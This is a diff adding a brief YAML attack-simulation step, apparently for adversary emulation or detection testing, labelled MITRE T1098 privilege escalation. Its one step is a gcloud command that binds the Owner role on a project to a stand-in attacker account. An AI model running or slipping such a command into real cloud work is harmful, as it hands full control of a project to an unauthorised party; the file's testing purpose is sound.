@@ -1,0 +1,7 @@
+name: Grant IAM Roles via gcloud
+description: Grant IAM Roles via gcloud
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+- action: gcloud projects add-iam-policy-binding my-project --member user:attacker@example.com --role roles/owner
+  description: Gain full access to project
